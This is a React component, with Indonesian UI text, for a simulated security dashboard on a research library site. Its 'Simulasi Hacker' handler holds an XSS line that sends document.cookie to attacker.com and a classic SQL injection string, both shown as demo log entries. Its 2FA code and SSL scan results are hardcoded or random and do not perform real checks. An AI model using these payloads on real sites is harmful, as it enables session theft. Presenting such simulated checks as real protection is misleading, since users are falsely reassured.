import React, { useState, useEffect } from "react";
import { 
  ShieldCheck, 
  ShieldAlert, 
  Lock, 
  Unlock, 
  Eye, 
  EyeOff, 
  Info, 
  CheckCircle, 
  AlertTriangle, 
  Zap, 
  Terminal, 
  Key, 
  Activity, 
  Globe, 
  HelpCircle, 
  RefreshCw,
  UserCheck
} from "lucide-react";

interface SecurityLog {
  timestamp: string;
  type: "XSS" | "SQL_INJECTION" | "DOMISILI_SPOOF" | "BRUTE_FORCE_BLOCKED" | "SYSTEM_AUDIT" | "FIREWALL_RULE";
  severity: "LOW" | "MEDIUM" | "HIGH" | "CRITICAL";
  ipAddress: string;
  payload: string;
  message: string;
}

interface SecurityConsoleProps {
  currentUser: any;
  visualTheme: "luks-akademis" | "neon-lab" | "sederhana-modern";
}

const PRESET_SECURITY_LOGS: SecurityLog[] = [
  {
    timestamp: new Date(Date.now() - 3600000).toLocaleTimeString(),
    type: "SYSTEM_AUDIT",
    severity: "LOW",
    ipAddress: "127.0.0.1",
    payload: "N/A",
    message: "Integritas SSL/TLS 1.3 diverifikasi. Seluruh koneksi nirkabel dienkripsi."
  },
  {
    timestamp: new Date(Date.now() - 1800000).toLocaleTimeString(),
    type: "FIREWALL_RULE",
    severity: "LOW",
    ipAddress: "103.24.162.2",
    payload: "Web Application Firewall (WAF) rule v2.4",
    message: "Pembatasan rate-limiting diaktifkan: Maksimal 60 request/menit per user session."
  },
  {
    timestamp: new Date(Date.now() - 900000).toLocaleTimeString(),
    type: "BRUTE_FORCE_BLOCKED",
    severity: "MEDIUM",
    ipAddress: "192.168.4.52",
    payload: "Login attempts exceeds 5x",
    message: "Alamat IP diblokir selama 15 menit akibat kegagalan mencocokkan kredensial."
  }
];

export default function SecurityConsole({ currentUser, visualTheme }: SecurityConsoleProps) {
  // Main states
  const [isProtected, setIsProtected] = useState<boolean>(true);
  const [lockdownMode, setLockdownMode] = useState<boolean>(() => {
    return localStorage.getItem("litera_lockdown_active") === "true";
  });
  
  const [alertCount, setAlertCount] = useState<number>(() => {
    return parseInt(localStorage.getItem("litera_blocked_threats") || "3", 10);
  });

  const [securityLogs, setSecurityLogs] = useState<SecurityLog[]>(() => {
    const saved = localStorage.getItem("litera_security_logs");
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch {
        return PRESET_SECURITY_LOGS;
      }
    }
    return PRESET_SECURITY_LOGS;
  });

  // Antiphishing Domain validation check
  const [isDomainSafe, setIsDomainSafe] = useState<boolean>(true);
  const [browserDomain, setBrowserDomain] = useState<string>("Situs Terverifikasi SSL");
  const [verifyPulse, setVerifyPulse] = useState<boolean>(false);

  // 2FA state simulation
  const [twoFaActive, setTwoFaActive] = useState<boolean>(() => {
    return localStorage.getItem("litera_2fa_active") === "true";
  });
  const [twoFaCode, setTwoFaCode] = useState<string>("148 920");

  // Educational phishing Quiz tab states
  const [quizScore, setQuizScore] = useState<number>(0);
  const [quizAnswered, setQuizAnswered] = useState<boolean>(false);
  const [quizFeedback, setQuizFeedback] = useState<string>("");

  // Function to pull live metrics from the backend security server
  const fetchLiveSecurityStats = async () => {
    try {
      const res = await fetch("/api/security/stats");
      if (res.ok) {
        const data = await res.json();
        if (data.threatLogs) {
          setSecurityLogs(data.threatLogs);
          localStorage.setItem("litera_security_logs", JSON.stringify(data.threatLogs));
        }
        if (data.totalBlocked !== undefined) {
          setAlertCount(data.totalBlocked);
          localStorage.setItem("litera_blocked_threats", String(data.totalBlocked));
        }
        if (data.lockdownActive !== undefined) {
          setLockdownMode(data.lockdownActive);
          localStorage.setItem("litera_lockdown_active", String(data.lockdownActive));
        }
      }
    } catch (err) {
      console.warn("Could not sync live security metrics from server, fallback to local storage:", err);
    }
  };

  // Monitor custom threats from window events and poll stats
  useEffect(() => {
    // Initial stats fetch
    fetchLiveSecurityStats();

    // Set up polling every 4 seconds to sync active rate limit blocks & other user sessions
    const interval = setInterval(fetchLiveSecurityStats, 4000);

    const handleThreatAlert = async (e: Event) => {
      const customEvent = e as CustomEvent;
      const { type, payload, message, severity } = customEvent.detail || {
        type: "XSS",
        payload: "<script>",
        message: "Serangan XSS dicegah instan.",
        severity: "HIGH"
      };

      // Push simulation/event to server to synchronize the data logged
      try {
        const res = await fetch("/api/security/simulate-threat", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type, payload, message, severity })
        });
        if (res.ok) {
          const stats = await res.json();
          if (stats.totalBlocked !== undefined) {
            setAlertCount(stats.totalBlocked);
          }
        }
      } catch (err) {
        console.warn("Backend threat log bypass, writing locally:", err);
      }

      // Local update as sturdy fallback
      const newLog: SecurityLog = {
        timestamp: new Date().toLocaleTimeString("id-ID"),
        type,
        severity,
        ipAddress: "103.88.22.4",
        payload,
        message
      };

      setSecurityLogs((prev) => {
        const updated = [newLog, ...prev].slice(0, 50);
        localStorage.setItem("litera_security_logs", JSON.stringify(updated));
        return updated;
      });

      setAlertCount((prev) => {
        const next = prev + 1;
        localStorage.setItem("litera_blocked_threats", String(next));
        return next;
      });
    };

    window.addEventListener("litera-security-threat", handleThreatAlert);

    // Initial domain verify
    if (typeof window !== "undefined") {
      const hostname = window.location.hostname || "localhost";
      setBrowserDomain(hostname);
      if (hostname.includes("ngrok") || hostname.includes("phish") || hostname.includes("temp-site")) {
        setIsDomainSafe(false);
      } else {
        setIsDomainSafe(true);
      }
    }

    return () => {
      clearInterval(interval);
      window.removeEventListener("litera-security-threat", handleThreatAlert);
    };
  }, []);

  const triggerVerificationScan = () => {
    setVerifyPulse(true);
    setTimeout(() => {
      setVerifyPulse(false);
      alert("Memindai Integritas Sandi & SSL:\n\n✔️ Protokol https:// aktif dan terenkripsi TLS 1.3\n✔️ Proteksi Clickjacking (X-Frame-Options) aman\n✔️ Header CSRF Token valid untuk form pengiriman riset\n✔️ Proteksi phishing domain aktif di sistem host.");
    }, 1200);
  };

  const toggleLockdown = async () => {
    const nextVal = !lockdownMode;
    setLockdownMode(nextVal);
    localStorage.setItem("litera_lockdown_active", String(nextVal));
    
    // Dispatch system-wide event for reactivity
    const event = new CustomEvent("litera-lockdown-changed", {
      detail: { active: nextVal }
    });
    window.dispatchEvent(event);

    // Sync central lockdown status to the Node.js server
    try {
      await fetch("/api/security/lockdown", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ active: nextVal })
      });
      fetchLiveSecurityStats();
    } catch (err) {
      console.warn("Could not synchronize server lockdown level:", err);
    }

    const log: SecurityLog = {
      timestamp: new Date().toLocaleTimeString("id-ID"),
      type: "SYSTEM_AUDIT",
      severity: nextVal ? "CRITICAL" : "LOW",
      ipAddress: "127.0.0.1",
      payload: `Lockdown Mode: ${nextVal ? "ON" : "OFF"}`,
      message: nextVal 
        ? "⚠️ PROTOKOL DARURAT: Menolak seluruh upaya menulis data/pertanyaan baru guna dekontaminasi server."
        : "🔓 Protokol darurat dinonaktifkan. Akses input riset normal kembali terbuka."
    };

    setSecurityLogs((prev) => {
      const updated = [log, ...prev];
      localStorage.setItem("litera_security_logs", JSON.stringify(updated));
      return updated;
    });
  };

  const generateNew2Fa = () => {
    const val = Math.floor(100000 + Math.random() * 900000).toString();
    const formatted = val.substring(0, 3) + " " + val.substring(3, 6);
    setTwoFaCode(formatted);
  };

  const toggle2Fa = () => {
    const nextVal = !twoFaActive;
    setTwoFaActive(nextVal);
    localStorage.setItem("litera_2fa_active", String(nextVal));
    if (nextVal) {
      generateNew2Fa();
    }
  };

  const handleClearLogs = () => {
    localStorage.removeItem("litera_security_logs");
    localStorage.setItem("litera_blocked_threats", "0");
    setAlertCount(0);
    setSecurityLogs([]);
  };

  const handleSimulateAttack = (attackType: "XSS" | "SQLi" | "Phishing") => {
    let detail = {};
    if (attackType === "XSS") {
      detail = {
        type: "XSS",
        payload: "<script>fetch('http://attacker.com/cookie?='+document.cookie)</script>",
        message: "Firewall mendeteksi payload XSS berbahaya di input teks & membersihkan tag HTML.",
        severity: "HIGH"
      };
    } else if (attackType === "SQLi") {
      detail = {
        type: "SQL_INJECTION",
        payload: "' OR '1'='1' --",
        message: "WAF memblokir karakter bypass query relasional SQL injection pada parameter filter.",
        severity: "CRITICAL"
      };
    } else {
      detail = {
        type: "DOMISILI_SPOOF",
        payload: "Origin: http://litera-sains-palsu.cfd",
        message: "Anti-Phishing Shield memblokir request tidak dikenal yang berupaya mengakses cookie session.",
        severity: "CRITICAL"
      };
    }

    const event = new CustomEvent("litera-security-threat", { detail });
    window.dispatchEvent(event);
  };

  const checkQuizAnswer = (isPhish: boolean) => {
    setQuizAnswered(true);
    if (isPhish) {
      setQuizScore(100);
      setQuizFeedback("✔️ BENAR! tautan 'http://pustaka-litera-sains.keuangan-ri.cfd' adalah tautan phishing! Domain palsu umumnya menggunakan domain tingkat akhir aneh (.cfd, .gq) dan protokol http non-terenkripsi.");
    } else {
      setQuizScore(0);
      setQuizFeedback("❌ SALAH! Hati-hati, tautan tersebut adalah tiruan phishing yang berupaya merekam password Anda. Link asli kami selalu menyandang https:// dengan domain/subdomain resmi dari tim kami.");
    }
  };

  return (
    <div id="cyber-protection-shield-station" className={`rounded-3xl border shadow-3xs overflow-hidden transition-all duration-300 ${
      visualTheme === "luks-akademis" 
        ? "bg-[#fbfcfa] border-[#163e2f]/10" 
        : visualTheme === "neon-lab" 
          ? "bg-[#0c0e17] border-indigo-500/20 text-slate-200" 
          : "bg-white border-slate-200"
    }`}>
      
      {/* Banner / Header Perlindungan Paralel */}
      <div className={`p-6 flex flex-col md:flex-row md:items-center justify-between gap-5 border-b border-slate-100 ${
        visualTheme === "luks-akademis" 
          ? "bg-[#163e2f]/5" 
          : visualTheme === "neon-lab" 
            ? "bg-[#0a0c14]" 
            : "bg-slate-50"
      }`}>
        <div className="flex items-start gap-3.5">
          <div className={`p-3 rounded-2xl shrink-0 ${
            lockdownMode 
              ? "bg-rose-500/10 text-rose-600 animate-pulse" 
              : "bg-emerald-500/10 text-emerald-600"
          }`}>
            {lockdownMode ? <ShieldAlert size={22} /> : <ShieldCheck size={22} />}
          </div>
          <div>
            <div className="flex items-center gap-2.5">
              <h3 className="text-sm font-black font-sans text-slate-800 tracking-tight theme-inherit-color">
                Sistem Pertahanan Keamanan Siber & Anti-Phishing 2026
              </h3>
              <span className={`text-[9.5px] font-mono tracking-wider uppercase font-bold px-2.5 py-0.5 rounded-full ${
                lockdownMode 
                  ? "bg-rose-500 text-white" 
                  : "bg-emerald-500 text-slate-950 animate-pulse"
              }`}>
                {lockdownMode ? "PROSEDUR KARANTINA AKTIF" : "SISTEM PROAKTIF AMAN"}
              </span>
            </div>
            <p className="text-[11px] text-slate-500 font-mono mt-0.5 theme-inherit-muted">
              Melindungi data hasil riset, cookie session, serta info otentikasi pemilik/pengunjung dari serangan injeksi XSS, SQLi, pembajakan DNS, maupun kloning situs tiruan.
            </p>
          </div>
        </div>

        {/* Emergency Lockdown toggle click button */}
        <button
          id="toggle-emergency-lockdown-btn"
          onClick={toggleLockdown}
          className={`px-4 py-2.5 rounded-xl text-xs font-mono font-bold transition duration-200 flex items-center gap-2 cursor-pointer shadow-2xs shrink-0 ${
            lockdownMode 
              ? "bg-emerald-600 text-white hover:bg-emerald-500" 
              : "bg-rose-600 hover:bg-rose-700 text-white"
          }`}
          title={lockdownMode ? "Lepaskan Karantina" : "Aktifkan Karantina (Lockdown) Darurat"}
        >
          {lockdownMode ? <Unlock size={14} /> : <Lock size={14} />}
          <span>{lockdownMode ? "Matikan Lockdown" : "AKTIFKAN LOCKDOWN DARURAT"}</span>
        </button>
      </div>

      <div className="p-6 space-y-6">
        
        {/* Anti-Hacking & Proactive Monitors grid desk */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
          
          {/* Box 1: Guardian Domain Shield (Anti-Phishing & Anti-Cloning SSL) */}
          <div className="bg-slate-50/50 p-4 rounded-2xl border border-slate-150 flex flex-col justify-between space-y-3.5 hover:bg-slate-50">
            <div>
              <div className="flex items-center justify-between mb-2">
                <span className="text-[10px] text-slate-400 font-mono font-bold uppercase tracking-wider">Pelindung Phishing Domain</span>
                <Globe size={13} className={isDomainSafe ? "text-emerald-500" : "text-rose-500 animate-bounce"} />
              </div>
              <h4 className="font-bold text-[11px] font-sans text-slate-700 flex items-center gap-1.5 theme-inherit-color">
                Host aktif: <code className="bg-slate-200 px-1.5 py-0.5 rounded font-mono text-indigo-700 text-[10px]">{browserDomain}</code>
              </h4>
              <p className="text-[10.5px] text-slate-500 font-mono leading-relaxed mt-1.5 theme-inherit-muted">
                Sistem mendeteksi apakah Anda terhubung di jalur orisinal. Proteksi DNS spoofing memastikan data tidak dibajak oleh pihak ketiga.
              </p>
            </div>

            <div className="pt-2 border-t border-slate-100 flex items-center justify-between">
              <span className="text-[9.5px] font-mono text-emerald-600 font-bold flex items-center gap-1">
                <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping" />
                TLS 1.3 Certified
              </span>
              <button
                type="button"
                onClick={triggerVerificationScan}
                disabled={verifyPulse}
                className="px-2.5 py-1 bg-white hover:bg-indigo-50 text-indigo-700 font-mono text-[9px] uppercase font-bold rounded-lg border border-indigo-200 transition duration-150 cursor-pointer"
              >
                {verifyPulse ? "Memindai..." : "Scan Sertifikasi"}
              </button>
            </div>
          </div>

          {/* Box 2: Rate Limit and Active Threats counter blocker */}
          <div className="bg-slate-50/50 p-4 rounded-2xl border border-slate-150 flex flex-col justify-between space-y-3.5 hover:bg-slate-50">
            <div>
              <div className="flex items-center justify-between mb-2">
                <span className="text-[10px] text-slate-400 font-mono font-bold uppercase tracking-wider">Bloker Ancaman Siber</span>
                <span className="text-[9px] font-mono bg-[#102d22] text-emerald-300 font-bold px-2 py-0.5 rounded border border-emerald-500/20 uppercase">WAF Aktif</span>
              </div>
              <div className="flex items-baseline gap-1.5">
                <span className="text-xl font-black font-sans text-slate-800 theme-inherit-color">{alertCount}</span>
                <span className="text-[9.5px] text-rose-500 font-mono font-bold">Injeksi Meluncur Dicegah</span>
              </div>
              <p className="text-[10.5px] text-slate-500 font-mono leading-relaxed mt-2.5 theme-inherit-muted">
                Mendeteksi, memfilter, dan mendeinfeksi secara paralel seluruh muatan payload skrip asing yang dikirim pengunjung publik secara nirlaba.
              </p>
            </div>

            <div className="pt-2 border-t border-slate-100 flex items-center justify-between">
              <span className="text-[9.5px] font-mono text-indigo-650 font-bold">XSS & SQLi Shield Active</span>
              <button
                type="button"
                onClick={() => handleSimulateAttack("XSS")}
                className="px-2.5 py-1 bg-white hover:bg-rose-50 text-rose-600 font-mono text-[9px] uppercase font-bold rounded-lg border border-rose-200 transition duration-150 cursor-pointer"
              >
                Simulasi Hacker
              </button>
            </div>
          </div>

          {/* Box 3: Owner 2-Factor Authentication Desk */}
          <div className={`p-4 rounded-2xl border flex flex-col justify-between space-y-3.5 transition-all ${
            twoFaActive 
              ? "bg-[#102d22]/5 border-emerald-500/20" 
              : "bg-slate-50/50 border-slate-150 hover:bg-slate-50"
          }`}>
            <div>
              <div className="flex items-center justify-between mb-2">
                <span className="text-[10px] text-slate-400 font-mono font-bold uppercase tracking-wider">Otentikasi Berlapis (2FA)</span>
                <Key size={13} className={twoFaActive ? "text-emerald-500" : "text-slate-400"} />
              </div>
              <div className="flex items-center justify-between">
                <div>
                  <span className="text-[10px] font-mono text-slate-400">Kode Token Dinamis Anda:</span>
                  <div className="text-sm font-mono font-black text-slate-800 tracking-wider theme-inherit-color mt-0.5">
                    {twoFaActive ? twoFaCode : "DISABLED"}
                  </div>
                </div>
                {twoFaActive && (
                  <button
                    onClick={generateNew2Fa}
                    className="p-1.5 bg-white border rounded-lg hover:bg-slate-50 cursor-pointer"
                    title="Segarkan Token OTP"
                  >
                    <RefreshCw size={11} className="text-slate-500" />
                  </button>
                )}
              </div>
              <p className="text-[10.5px] text-slate-500 font-mono leading-relaxed mt-2 theme-inherit-muted">
                Mencegah hacker membongkar akun pemilik atau database pustaka di browser lain sekalipun mereka mengetahui kata sandi Anda.
              </p>
            </div>

            <div className="pt-2 border-t border-slate-100/60 flex items-center justify-between">
              <span className="text-[9.5px] font-mono text-slate-400 font-bold">2-Factor Authentication</span>
              <button
                type="button"
                onClick={toggle2Fa}
                className={`px-3 py-1 font-mono text-[9.5px] uppercase font-bold rounded-lg transition duration-150 cursor-pointer ${
                  twoFaActive 
                    ? "bg-rose-500/10 text-rose-600 border border-rose-200" 
                    : "bg-emerald-600 text-white hover:bg-emerald-500"
                }`}
              >
                {twoFaActive ? "Matikan 2FA" : "Aktifkan 2FA"}
              </button>
            </div>
          </div>

        </div>

        {/* Education Area: Mini Phishing detection interactive card for research visitors */}
        <div className="p-5 bg-amber-500/5 rounded-2xl border border-amber-500/15">
          <div className="flex items-start gap-3">
            <div className="p-2 bg-amber-500/10 text-amber-700 rounded-xl shrink-0">
              <AlertTriangle size={16} className="animate-bounce" />
            </div>
            <div className="flex-grow space-y-2.5">
              <div>
                <h4 className="text-xs font-bold text-amber-900 font-sans tracking-wide">
                  Edukasi Pengunjung: Hindari Phishing Tiruan Berbahaya!
                </h4>
                <p className="text-[11px] text-slate-600 leading-relaxed font-sans">
                  Kejahatan internet sering kali mengkloning visual perpustakaan kami ke domain palsu untuk mencuri data pribadi atau password kredensial Anda. Mari asah ketelitian Anda.
                </p>
              </div>

              {/* Challenge question */}
              <div className="p-3 bg-white rounded-xl border border-amber-200 text-xs">
                <span className="font-bold block text-[10px] text-slate-500 font-mono uppercase tracking-wider mb-1">Tantangan Keamanan:</span>
                <p className="font-medium text-slate-800">
                  Seorang pengirim pesan mengirimi email berisi link rujukan riset air sawit: <code className="bg-slate-100 p-1 rounded font-mono text-rose-600">http://pustaka-litera-sains.keuangan-ri.cfd/inventaris</code>. Apakah ini tautan aman atau phishing?
                </p>
                
                <div className="flex flex-wrap gap-2 mt-3">
                  <button
                    type="button"
                    disabled={quizAnswered}
                    onClick={() => checkQuizAnswer(false)}
                    className="px-3.5 py-1.5 bg-slate-100 hover:bg-slate-200 rounded-lg font-mono text-[10.5px] font-bold cursor-pointer transition disabled:opacity-50"
                  >
                    Aman, karena membawa nama keuangan-ri
                  </button>
                  <button
                    type="button"
                    disabled={quizAnswered}
                    onClick={() => checkQuizAnswer(true)}
                    className="px-3.5 py-1.5 bg-rose-600 hover:bg-rose-700 text-white rounded-lg font-mono text-[10.5px] font-bold cursor-pointer transition disabled:opacity-50"
                  >
                    Mencurigakan (Phishing)!
                  </button>
                </div>

                {quizAnswered && (
                  <div className="mt-3 p-3 bg-blue-50 text-blue-900 rounded-xl border border-blue-200 text-[11px] leading-relaxed animate-fade-in font-sans">
                    {quizFeedback}
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* Real-time Firewall Activity block logger console */}
        <div className="border-t border-slate-100/80 pt-5">
          <div className="flex items-center justify-between mb-2">
            <h4 className="text-[10px] font-bold text-slate-400 uppercase tracking-wider font-mono flex items-center gap-1.5">
              <Terminal size={12} className="text-indigo-650 animate-pulse" />
              Buku Log Detektor & Pembersih Payload Melaju Siber
            </h4>
            
            {securityLogs.length > 0 && (
              <button
                type="button"
                onClick={handleClearLogs}
                className="text-[9.5px] font-mono text-slate-400 hover:text-rose-600 underline cursor-pointer"
              >
                Hapus & Bersihkan Log
              </button>
            )}
          </div>

          <div className="bg-slate-950 border border-black rounded-xl p-3.5 max-h-48 overflow-y-auto space-y-2 text-[9.5px] font-mono text-emerald-400">
            {securityLogs.length === 0 ? (
              <div className="py-4 text-center text-slate-500">
                Ketiadaan rekaman ancaman melaju di luar sirkulasi lokal. Semua gerbang aman.
              </div>
            ) : (
              securityLogs.map((log, index) => (
                <div key={index} className="flex flex-col sm:flex-row sm:items-start justify-between gap-1.5 border-b border-white/5 pb-2 last:border-b-0 last:pb-0">
                  <div className="space-y-1">
                    <div className="flex items-center gap-2">
                      <span className="text-slate-450">[{log.timestamp}]</span>
                      <span className={`px-1.5 py-0.2 rounded font-black text-[8.5px] uppercase ${
                        log.severity === "CRITICAL" 
                          ? "bg-rose-500 text-slate-950 font-black animate-pulse" 
                          : log.severity === "HIGH" 
                            ? "bg-amber-500 text-slate-950" 
                            : log.severity === "MEDIUM" 
                              ? "bg-indigo-500 text-white" 
                              : "bg-slate-700 text-indigo-300"
                      }`}>
                        {log.type} // {log.severity}
                      </span>
                      <span className="text-slate-500">IP: {log.ipAddress}</span>
                    </div>
                    <p className="text-white/90 leading-relaxed font-sans text-[10px]">
                      {log.message}
                    </p>
                  </div>
                  
                  {log.payload !== "N/A" && (
                    <div className="bg-slate-900/60 p-1.5 rounded border border-white/5 text-[9px] text-indigo-400 font-mono break-all max-w-[240px] mt-1 sm:mt-0">
                      Payload: {log.payload}
                    </div>
                  )}
                </div>
              ))
            )}
          </div>

          {/* Prompt warning simulating interactive payload testing */}
          <div className="mt-2.5 flex items-center justify-between text-[10px] font-mono text-slate-400 px-1">
            <span>Uji coba integritas dengan memicu simulasi di sebelah kanan setiap opsi desk.</span>
            <div className="flex gap-2">
              <span className="hover:text-slate-500 cursor-pointer" onClick={() => handleSimulateAttack("SQLi")}>[Simulasi SQL Injection]</span>
              <span className="hover:text-slate-500 cursor-pointer" onClick={() => handleSimulateAttack("Phishing")}>[Simulasi Spoof Domain]</span>
            </div>
          </div>
        </div>

      </div>
    </div>
  );
}
